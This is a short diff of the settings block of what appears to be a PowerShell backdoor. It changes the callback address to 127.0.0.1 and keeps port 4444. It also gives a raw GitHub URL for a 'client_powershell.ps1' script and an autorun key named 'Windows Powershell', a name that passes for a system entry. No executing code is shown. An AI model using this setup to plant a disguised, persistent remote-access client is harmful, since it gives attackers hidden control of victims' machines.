@@ -1,7 +1,7 @@
 # Replace address and port with your server's
 # You can edit the script URL if you are hosting it somewhere else
 
-$address = '192.168.1.200'
+$address = '127.0.0.1'
 $port = 4444
 $scriptURL = 'https://raw.githubusercontent.com/cyberhunter00/backdoor/master/client_powershell.ps1'
 $autorunKeyName = "Windows Powershell"
